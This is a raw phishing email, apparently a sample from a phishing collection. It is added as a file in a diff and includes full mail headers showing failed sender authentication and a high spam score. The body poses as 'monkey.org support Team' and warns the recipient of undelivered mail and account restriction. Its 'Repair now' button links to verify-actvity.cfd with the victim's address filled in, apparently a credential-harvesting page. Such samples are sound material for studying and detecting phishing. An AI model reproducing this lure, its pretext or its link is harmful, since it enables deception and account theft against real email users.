@@ -1,0 +1,110 @@
+Return-Path: support@lifecellfarma.net
+Delivered-To: jose@monkey.org
+X-FDA: 81762659538.09.C90508C
+Received: from srv.uraw.com.tr (unknown [89.252.138.157])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id 1A445120016
+	for <jose@monkey.org>; Tue,  6 Feb 2024 21:25:07 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=none (imf03.b.hostedemail.com: domain of support@lifecellfarma.net has no
+ SPF policy when checking 89.252.138.157)
+ smtp.mailfrom=support@lifecellfarma.net
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1707254708;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=ocSpJkjsR+hVlIBOuJn+KQLCJdwmqv8iJF7r48uIXZQ=;
+	b=Wyy3gspn3fQiD5oFKJQlsk+h0YkoVN0AGaWCTs4egnUPImDZBVqZS1pMDElvB7GhMjqAiP
+	HGjqENmAZ0TvMGIX6etu5AkBhiBcyUhIDm+R5U5saWF2dMCPIBYpGcmG1Go4vfyDpWzIbW
+	1YCyTj+JyTWYlgZEMgAfmm2fRhjdA1k=
+ARC-Authentication-Results: i=1;	imf03.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=none (imf03.b.hostedemail.com: domain of
+ support@lifecellfarma.net has no SPF policy when checking 89.252.138.157)
+ smtp.mailfrom=support@lifecellfarma.net
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1707254708; a=rsa-sha256;
+	cv=none;
+	b=ByaCJEKMiYiabsPyolHeDL6x7cK7ncmpPSqKwRUL8ulU3KW3Mj2qNbvNLntEvvtLlDRuPl
+	jAAWTHV0ybZwP//y6X+B2y+8856wg/uzM2mY7140EEHHVdTP3U5UYyaoGavdAhYy6mZLJD
+	q8pYSxBrjxdlRu+eqthOTqDzAGhJ8n8=
+Received: by srv.uraw.com.tr (Postfix, from userid 10012)
+	id 5C5736027411A; Wed,  7 Feb 2024 00:22:23 +0300 (+03)
+To: jose@monkey.org
+Subject: Review MailBox Issue!!!
+Date: Tue, 6 Feb 2024 21:22:23 +0000
+From: SUPPORT CENTER <support@lifecellfarma.net>
+Message-ID: <06e85bb159eb63147b2677b48e5ae688@lifecellfarma.net>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="b1_06e85bb159eb63147b2677b48e5ae688"
+Content-Transfer-Encoding: 8bit
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 1A445120016
+X-Stat-Signature: 5no1fgcjjyx7kawtz9bjbpw7fhfexpoi
+X-Rspam-User: 
+X-Spam-Status: Yes, score=21.30
+X-HE-Tag: 1707254707-556053
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+1MId2lWxL9ZV9sCSKBRE65a5OEYuxasbmIe7b2gDYdF2?=
+ =?utf-8?q?dL1n7M3Re4uK27ew2AA4DYS45XvC2aJ/riW/x9PiiLp6z83s412mSHYbr9RxSSmKQ?=
+ =?utf-8?q?0qymVoGeXJax+rBHq5QJ93IuITR7M3i6u6+zyzxNpXBbiTIQNoQkzyzzWcdsGJGmw?=
+ =?utf-8?q?hcHcu575JdbNa+uK5l2QZqlEIKg4vkSvMOyblaxeBHqefp3JdvY+Tjz3x3dNhNfIO?=
+ =?utf-8?q?IKYnx053tOKf1vBp7bJzVYWiQWFd7RaQmSeH1Gy2+9HURVxesxLGknS56Ekiwq9/e?=
+ =?utf-8?q?/BQzRuQjw85YWnAzOZ7kjOaRqYW72zCBaqz5gLKLmHTZp4/Uvbl2IxDxNg7VODh8h?=
+ =?utf-8?q?bkx7HpjNLm6tzYVid47UyDloeuK2DkMtHPC/spoLBrV0mQAeHG5OfgmXSxPjKJo1L?=
+ =?utf-8?q?GhkCE7lXg4qfcWwxAllb4P8fSQEzoqNo3ExuQQZLILXt8a+T+fb1quezrs+5A4qYz?=
+ =?utf-8?q?mnHSf0bApbyazl0gPfNs3ste8xqnKl567iD08PpXZxaT7xApp2uKAbNSiOC3/Dzgv?=
+ =?utf-8?q?3x0mchGNmeOdPHmtMboB35W2x3F0LafCZC/MC7bZBhlZeUejwNep4xg=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 50
+
+This is a multi-part message in MIME format.
+
+--b1_06e85bb159eb63147b2677b48e5ae688
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Hello jose ,You have pending incoming emails that failed to process and deliver.Access to jose@monkey.org could  be restricted until you validate account.Repair nowNote:  Validation of account will allow immediate delivery of pending emails.Regardsmonkey.org support Team
+
+
+--b1_06e85bb159eb63147b2677b48e5ae688
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<div style=3D"font-family: arial; font-size: 14px;"><p style=3D"box-sizing:=
+border-box;margin-top:0px;margin-bottom:1rem;text-align:left;background-col=
+or:rgb(255, 255, 255);font-size:12px;font-family:Helvetica, Arial, sans-ser=
+if;color:rgb(34, 34, 34)">Hello jose ,</p><p style=3D"box-sizing:border-box=
+;margin-top:0px;margin-bottom:1rem;text-align:left;background-color:rgb(255=
+, 255, 255);font-size:12px;font-family:Helvetica, Arial, sans-serif;color:r=
+gb(34, 34, 34)">You have pending incoming emails<span style=3D"box-sizing:b=
+order-box;font-size:14px;font-family:Calibri, sans-serif">=C2=A0</span>that=
+ failed to process and deliver.</p><p style=3D"box-sizing:border-box;margin=
+-top:0px;margin-bottom:1rem;text-align:left;background-color:rgb(255, 255, =
+255);font-size:12px;font-family:Helvetica, Arial, sans-serif;color:rgb(34, =
+34, 34);padding-bottom:10px">Access to jose@monkey.org could  be restricted=
+ until you validate account.</p><p style=3D"box-sizing:border-box;margin-to=
+p:0px;margin-bottom:1rem;text-align:left;background-color:rgb(255, 255, 255=
+);font-size:12px;font-family:Helvetica, Arial, sans-serif;color:rgb(34, 34,=
+ 34)"><a href=3D"https://verify-actvity.cfd/gori/Resolve/?email=3Djose@monk=
+ey.org" target=3D"_blank" rel=3D"noreferrer" style=3D"box-sizing:border-box=
+;color:white;background-color:rgb(70, 139, 252);width:20px;padding:10px">Re=
+pair now</a></p><p style=3D"box-sizing:border-box;margin-top:0px;margin-bot=
+tom:1rem;text-align:left;background-color:rgb(255, 255, 255);font-size:12px=
+;font-family:Helvetica, Arial, sans-serif;color:rgb(34, 34, 34);padding-top=
+:10px"><b style=3D"box-sizing:border-box;font-weight:bolder">Note:</b><span=
+>=C2=A0</span>=C2=A0Validation of account will allow immediate delivery of =
+pending emails.</p><p style=3D"box-sizing:border-box;margin-top:0px;margin-=
+bottom:1rem;text-align:left;background-color:rgb(255, 255, 255);font-size:1=
+2px;font-family:Helvetica, Arial, sans-serif;color:rgb(34, 34, 34);padding-=
+top:10px">Regards<br style=3D"box-sizing:border-box">monkey.org<b style=3D"=
+box-sizing:border-box;font-weight:bolder"><span>=C2=A0</span>support Team</=
+b></p><br></div><div class=3D"protonmail_signature_block" style=3D"font-fam=
+ily: arial; font-size: 14px;">
+</div>
+
+
+--b1_06e85bb159eb63147b2677b48e5ae688--
+
+
